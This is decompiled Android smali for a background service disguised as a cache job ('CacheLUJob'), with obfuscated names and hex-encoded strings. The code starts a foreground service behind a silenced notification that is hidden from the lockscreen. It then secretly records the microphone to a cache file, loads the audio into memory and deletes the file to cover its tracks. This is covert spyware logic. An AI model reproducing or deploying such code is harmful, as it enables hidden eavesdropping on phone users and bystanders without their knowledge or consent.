.class public final Lapp/mobilex/plus/services/CacheLUJob;
.super Landroid/app/Service;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field public static final Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

.field public static b1EoSIRjJHO5:J

.field public static volatile ibVTtJUNfrGYbW:[B

.field public static pyu8ovAipBTLYAiKab:I

.field public static volatile xDyLpEZyrcKVe0:Z


# instance fields
.field public JXn4Qf7zpnLjP5:I

.field public dDIMxZXP1V8HdM:Landroid/media/MediaRecorder;

.field public final vekpFI4d1Nc4fakF:Landroid/os/Handler;

.field public w9sT1Swbhx3hs:Ljava/io/File;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 1
    const-string v0, "00020063005F008E00FF008D00D700A4002C0064005F008200E2"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    const-string v0, "00220063005F008E00FF008000C000A2002000790049008300F900B100D5"

    .line 7
    .line 8
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    .line 10
    .line 11
    move-result-object v0

    .line 12
    sput-object v0, Lapp/mobilex/plus/services/CacheLUJob;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 13
    .line 14
    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Landroid/os/Handler;

    .line 5
    .line 6
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 7
    .line 8
    .line 9
    move-result-object v1

    .line 10
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 11
    .line 12
    .line 13
    iput-object v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->vekpFI4d1Nc4fakF:Landroid/os/Handler;

    .line 14
    .line 15
    const/16 v0, 0x1e

    .line 16
    .line 17
    iput v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->JXn4Qf7zpnLjP5:I

    .line 18
    .line 19
    return-void
.end method


# virtual methods
.method public final dDIMxZXP1V8HdM()V
    .locals 4

    .line 1
    new-instance v0, Landroid/app/NotificationChannel;

    .line 2
    .line 3
    const-string v1, "0462042E040604A204D004E1048F04FF04740426047D04DF04DF"

    .line 4
    .line 5
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    move-result-object v1

    .line 9
    const/4 v2, 0x1

    .line 10
    sget-object v3, Lapp/mobilex/plus/services/CacheLUJob;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    nop

    .line 11
    .line 12
    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 13
    .line 14
    .line 15
    const-string v1, "04670428040604D904A204EF04FD00E70402042E040604A204D004E1048F04FF04740426047D04DF04DF00FF048604F7047E042B047004A2"

    .line 16
    .line 17
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 18
    .line 19
    .line 20
    move-result-object v1

    .line 21
    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 22
    .line 23
    .line 24
    const/16 v1, 0x0

    .line 25
    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 26
    .line 27
    .line 28
    const/16 v1, 0x0

    nop

    .line 29
    invoke-virtual {v0, v1, v1}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 30
    .line 31
    .line 32
    const/4 v1, -0x1

    .line 33
    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 34
    .line 35
    .line 36
    const-class v1, Landroid/app/NotificationManager;

    .line 37
    .line 38
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    .line 39
    .line 40
    .line 41
    move-result-object v1

    .line 42
    check-cast v1, Landroid/app/NotificationManager;

    .line 43
    .line 44
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 45
    .line 46
    .line 47
    return-void
.end method

.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    .line 1
    const/4 p1, 0x0

    .line 2
    return-object p1
.end method

.method public final onCreate()V
    .locals 0

    .line 1
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 2
    .line 3
    .line 4
    invoke-virtual {p0}, Lapp/mobilex/plus/services/CacheLUJob;->dDIMxZXP1V8HdM()V

    .line 5
    .line 6
    .line 7
    return-void
.end method

.method public final onDestroy()V
    .locals 2

    .line 1
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 2
    .line 3
    .line 4
    sget-boolean v0, Lapp/mobilex/plus/services/CacheLUJob;->xDyLpEZyrcKVe0:Z

    .line 5
    .line 6
    if-eqz v0, :cond_0

    .line 7
    .line 8
    invoke-virtual {p0}, Lapp/mobilex/plus/services/CacheLUJob;->w9sT1Swbhx3hs()V

    .line 9
    .line 10
    .line 11
    :cond_0
    iget-object v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->vekpFI4d1Nc4fakF:Landroid/os/Handler;

    .line 12
    .line 13
    const/4 v1, 0x0

    .line 14
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    .line 15
    .line 16
    .line 17
    const-string v0, "000000770058008F00F5009300E7008D002C0074001B008300F500AC00C600B5002C006F005E0083"

    .line 18
    .line 19
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 20
    .line 21
    .line 22
    return-void
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    .line 1
    const/4 p2, 0x1

    .line 2
    const/4 p3, 0x2

    .line 3
    :try_start_0
    invoke-virtual {p0}, Lapp/mobilex/plus/services/CacheLUJob;->dDIMxZXP1V8HdM()V

    .line 4
    .line 5
    .line 6
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 7
    .line 8
    const/16 v1, 0x22

    nop

    nop

    .line 9
    .line 10
    const/16 v2, -0x2

    .line 11
    const v3, 0x7f050021

    .line 12
    .line 13
    .line 14
    if-lt v0, v1, :cond_0

    .line 15
    .line 16
    new-instance v0, Lv/s/s4Xe0OepSKbHpb3Nsd;

    nop

    .line 17
    .line 18
    sget-object v1, Lapp/mobilex/plus/services/CacheLUJob;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 19
    .line 20
    invoke-direct {v0, p0, v1}, Lv/s/s4Xe0OepSKbHpb3Nsd;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 21
    .line 22
    .line 23
    iget-object v1, v0, Lv/s/s4Xe0OepSKbHpb3Nsd;->K7eEOBPYP9VIoHWTe:Landroid/app/Notification;

    .line 24
    .line 25
    iput v3, v1, Landroid/app/Notification;->icon:I

    .line 26
    .line 27
    iput v2, v0, Lv/s/s4Xe0OepSKbHpb3Nsd;->hjneShqpF9Tis4:I

    .line 28
    .line 29
    invoke-virtual {v0, p3, p2}, Lv/s/s4Xe0OepSKbHpb3Nsd;->vekpFI4d1Nc4fakF(IZ)V

    .line 30
    .line 31
    .line 32
    iput-boolean p2, v0, Lv/s/s4Xe0OepSKbHpb3Nsd;->dTS0S7eC32ubQH54j36:Z

    .line 33
    .line 34
    invoke-virtual {v0}, Lv/s/s4Xe0OepSKbHpb3Nsd;->dDIMxZXP1V8HdM()Landroid/app/Notification;

    .line 35
    .line 36
    .line 37
    move-result-object v0

    .line 38
    invoke-static {p0, v0}, Lv/s/JW3Lh9hxwLsO2ArTlH;->wotphlvK9sPbXJ(Lapp/mobilex/plus/services/CacheLUJob;Landroid/app/Notification;)V

    .line 39
    .line 40
    .line 41
    goto/16 :goto_0

    .line 42
    :cond_0
    new-instance v0, Lv/s/s4Xe0OepSKbHpb3Nsd;

    .line 43
    .line 44
    sget-object v1, Lapp/mobilex/plus/services/CacheLUJob;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 45
    .line 46
    invoke-direct {v0, p0, v1}, Lv/s/s4Xe0OepSKbHpb3Nsd;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 47
    .line 48
    .line 49
    iget-object v1, v0, Lv/s/s4Xe0OepSKbHpb3Nsd;->K7eEOBPYP9VIoHWTe:Landroid/app/Notification;

    .line 50
    .line 51
    iput v3, v1, Landroid/app/Notification;->icon:I

    .line 52
    .line 53
    iput v2, v0, Lv/s/s4Xe0OepSKbHpb3Nsd;->hjneShqpF9Tis4:I

    .line 54
    .line 55
    invoke-virtual {v0, p3, p2}, Lv/s/s4Xe0OepSKbHpb3Nsd;->vekpFI4d1Nc4fakF(IZ)V

    .line 56
    .line 57
    .line 58
    iput-boolean p2, v0, Lv/s/s4Xe0OepSKbHpb3Nsd;->dTS0S7eC32ubQH54j36:Z

    .line 59
    .line 60
    invoke-virtual {v0}, Lv/s/s4Xe0OepSKbHpb3Nsd;->dDIMxZXP1V8HdM()Landroid/app/Notification;

    .line 61
    .line 62
    .line 63
    move-result-object v0

    .line 64
    const/16 v1, 0xbb9

    .line 65
    .line 66
    invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 67
    .line 68
    .line 69
    :catch_0
    :goto_0
    const/16 v0, 0x1e

    .line 70
    .line 71
    if-eqz p1, :cond_1

    .line 72
    .line 73
    const-string v1, "002700630049008600E400B600DD00A9"

    .line 74
    .line 75
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    move-result-object v1

    .line 79
    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    .line 80
    .line 81
    .line 82
    move-result v0

    .line 83
    :cond_1
    iput v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->JXn4Qf7zpnLjP5:I

    .line 84
    .line 85
    const-string p1, "android.permission.RECORD_AUDIO"

    .line 86
    .line 87
    invoke-static {p0, p1}, Lv/s/RIZfHbqXpth8r2yN4;->vekpFI4d1Nc4fakF(Landroid/content/Context;Ljava/lang/String;)I

    .line 88
    .line 89
    .line 90
    move-result p1

    .line 91
    if-eqz p1, :cond_2

    .line 92
    .line 93
    const-string p1, "001100730058008800E200BB009200A6003600720052008800B000AF00D700B5002E007F0048009400F900B000DC00E7002D0079004F00C700F700AD00D300A900370073005F"

    .line 94
    .line 95
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 96
    .line 97
    .line 98
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 99
    .line 100
    .line 101
    return p3

    .line 102
    :cond_2
    :try_start_1
    new-instance p1, Ljava/io/File;

    .line 103
    .line 104
    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    .line 105
    .line 106
    .line 107
    move-result-object v0

    nop

    .line 108
    const-string v1, "00220063005F008E00FF0080"

    .line 109
    .line 110
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 111
    .line 112
    .line 113
    move-result-object v1

    nop

    .line 114
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 115
    .line 116
    .line 117
    move-result-wide v2

    .line 118
    const-string v4, "006D007B000F0086"

    .line 119
    .line 120
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 121
    .line 122
    .line 123
    move-result-object v4

    .line 124
    new-instance v5, Ljava/lang/StringBuilder;

    .line 125
    .line 126
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 127
    .line 128
    .line 129
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 130
    .line 131
    .line 132
    invoke-virtual {v5, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    .line 133
    .line 134
    .line 135
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 136
    .line 137
    .line 138
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 139
    .line 140
    .line 141
    move-result-object v1

    .line 142
    invoke-direct {p1, v0, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 143
    .line 144
    .line 145
    iput-object p1, p0, Lapp/mobilex/plus/services/CacheLUJob;->w9sT1Swbhx3hs:Ljava/io/File;

    .line 146
    .line 147
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 148
    .line 149
    const/16 v0, 0x1f

    .line 150
    .line 151
    if-lt p1, v0, :cond_3

    .line 152
    .line 153
    new-instance p1, Landroid/media/MediaRecorder;

    .line 154
    .line 155
    invoke-static {p0}, Lv/s/bzHLgVWZZfjKGub8Jt;->dDIMxZXP1V8HdM(Lapp/mobilex/plus/services/CacheLUJob;)Landroid/media/MediaRecorder;

    .line 156
    .line 157
    .line 158
    move-result-object p1

    .line 159
    goto :goto_1

    .line 160
    :catch_1
    move-exception p1

    .line 161
    goto :goto_3

    .line 162
    :cond_3
    new-instance p1, Landroid/media/MediaRecorder;

    .line 163
    .line 164
    invoke-direct {p1}, Landroid/media/MediaRecorder;-><init>()V

    .line 165
    .line 166
    .line 167
    :goto_1
    iput-object p1, p0, Lapp/mobilex/plus/services/CacheLUJob;->dDIMxZXP1V8HdM:Landroid/media/MediaRecorder;

    .line 168
    .line 169
    invoke-virtual {p1, p2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 170
    .line 171
    .line 172
    invoke-virtual {p1, p3}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 173
    .line 174
    .line 175
    const/4 v0, 0x3

    .line 176
    invoke-virtual {p1, v0}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 177
    .line 178
    .line 179
    const v0, 0xac44

    .line 180
    .line 181
    .line 182
    invoke-virtual {p1, v0}, Landroid/media/MediaRecorder;->setAudioSamplingRate(I)V

    .line 183
    .line 184
    .line 185
    const v0, 0x1f400

    .line 186
    .line 187
    .line 188
    invoke-virtual {p1, v0}, Landroid/media/MediaRecorder;->setAudioEncodingBitRate(I)V

    .line 189
    .line 190
    .line 191
    iget-object v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->w9sT1Swbhx3hs:Ljava/io/File;

    .line 192
    .line 193
    if-eqz v0, :cond_4

    .line 194
    .line 195
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 196
    .line 197
    .line 198
    move-result-object v0

    .line 199
    goto :goto_2

    .line 200
    :cond_4
    const/4 v0, 0x0

    .line 201
    :goto_2
    invoke-virtual {p1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 202
    .line 203
    .line 204
    invoke-virtual {p1}, Landroid/media/MediaRecorder;->prepare()V

    .line 205
    .line 206
    .line 207
    invoke-virtual {p1}, Landroid/media/MediaRecorder;->start()V

    .line 208
    .line 209
    .line 210
    sput-boolean p2, Lapp/mobilex/plus/services/CacheLUJob;->xDyLpEZyrcKVe0:Z

    .line 211
    .line 212
    iget p1, p0, Lapp/mobilex/plus/services/CacheLUJob;->JXn4Qf7zpnLjP5:I

    .line 213
    .line 214
    sput p1, Lapp/mobilex/plus/services/CacheLUJob;->pyu8ovAipBTLYAiKab:I

    .line 215
    .line 216
    const-string p1, "001100730058008800E200BB00DB00A9002400360048009300F100AD00C600A200270036005D008800E200FF"

    .line 217
    .line 218
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 219
    .line 220
    .line 221
    const-string p1, "00630065005E008400FF00B100D600B4"

    .line 222
    .line 223
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 224
    .line 225
    .line 226
    iget-object p1, p0, Lapp/mobilex/plus/services/CacheLUJob;->vekpFI4d1Nc4fakF:Landroid/os/Handler;

    .line 227
    .line 228
    new-instance p2, Lv/s/hzCVl0f866ksvpzUUql;

    .line 229
    .line 230
    const/4 v0, 0x1

    .line 231
    invoke-direct {p2, v0, p0}, Lv/s/hzCVl0f866ksvpzUUql;-><init>(ILjava/lang/Object;)V

    .line 232
    .line 233
    .line 234
    iget v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->JXn4Qf7zpnLjP5:I

    .line 235
    .line 236
    int-to-long v0, v0

    .line 237
    const-wide/16 v2, 0x3e8

    .line 238
    .line 239
    mul-long/2addr v0, v2

    .line 240
    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 241
    .line 242
    .line 243
    goto/16 :goto_4

    .line 244
    :goto_3
    const-string p2, "00100062005A009500E400FF00C000A2002000790049008300F900B100D500E7002600640049008800E200E50092"

    .line 245
    .line 246
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 247
    .line 248
    .line 249
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 250
    .line 251
    .line 252
    const/4 p1, 0x0

    .line 253
    sput-boolean p1, Lapp/mobilex/plus/services/CacheLUJob;->xDyLpEZyrcKVe0:Z

    .line 254
    .line 255
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 256
    .line 257
    .line 258
    :goto_4
    return p3
.end method

.method public final w9sT1Swbhx3hs()V
    .locals 5

    .line 1
    :try_start_0
    iget-object v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->dDIMxZXP1V8HdM:Landroid/media/MediaRecorder;

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    .line 6
    .line 7
    .line 8
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 9
    .line 10
    .line 11
    goto/16 :goto_0

    nop

    nop

    .line 12
    :catchall_0
    move-exception v0

    .line 13
    goto/16 :goto_2

    .line 14
    :catch_0
    move-exception v0

    .line 15
    goto/16 :goto_1

    .line 16
    :cond_0
    :goto_0
    const/16 v0, 0x0

    .line 17
    iput-object v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->dDIMxZXP1V8HdM:Landroid/media/MediaRecorder;

    .line 18
    .line 19
    const/16 v0, 0x0

    .line 20
    sput-boolean v0, Lapp/mobilex/plus/services/CacheLUJob;->xDyLpEZyrcKVe0:Z

    nop

    .line 21
    .line 22
    iget-object v0, p0, Lapp/mobilex/plus/services/CacheLUJob;->w9sT1Swbhx3hs:Ljava/io/File;

    .line 23
    .line 24
    if-eqz v0, :cond_1

    .line 25
    .line 26
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    .line 27
    .line 28
    .line 29
    move-result v1

    .line 30
    if-eqz v1, :cond_1

    .line 31
    .line 32
    invoke-virtual {v0}, Ljava/io/File;->length()J

    .line 33
    .line 34
    .line 35
    move-result-wide v1

    .line 36
    const-wide/16 v3, 0x0

    .line 37
    .line 38
    cmp-long v1, v1, v3

    .line 39
    .line 40
    if-lez v1, :cond_1

    .line 41
    .line 42
    invoke-static {v0}, Lv/s/u4HKFgCbgUKtEQ;->yTljMGnIibTRdOpSh4(Ljava/io/File;)[B

    .line 43
    .line 44
    .line 45
    move-result-object v1

    .line 46
    sput-object v1, Lapp/mobilex/plus/services/CacheLUJob;->ibVTtJUNfrGYbW:[B

    .line 47
    .line 48
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 49
    .line 50
    .line 51
    move-result-wide v1

    .line 52
    sput-wide v1, Lapp/mobilex/plus/services/CacheLUJob;->b1EoSIRjJHO5:J

    .line 53
    .line 54
    const-string v1, "001100730058008800E200BB00DB00A9002400360048008600E600BA00D600FD0063"

    .line 55
    .line 56
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 57
    .line 58
    .line 59
    const-string v1, "006300740042009300F500AC"

    .line 60
    .line 61
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    .line 65
    .line 66
    .line 67
    :cond_1
    const-string v0, "001100730058008800E200BB00DB00A9002400360048009300FF00AF00C200A20027"

    .line 68
    .line 69
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 70
    .line 71
    .line 72
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 73
    .line 74
    .line 75
    return-void

    .line 76
    :goto_1
    :try_start_1
    const-string v1, "001000620054009700B000AD00D700A4002C0064005F008E00FE00B8009200A2003100640054009500AA00FF"

    .line 77
    .line 78
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 79
    .line 80
    .line 81
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 82
    .line 83
    .line 84
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 85
    .line 86
    .line 87
    return-void

    .line 88
    :goto_2
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 89
    .line 90
    .line 91
    throw v0

    nop
.end method
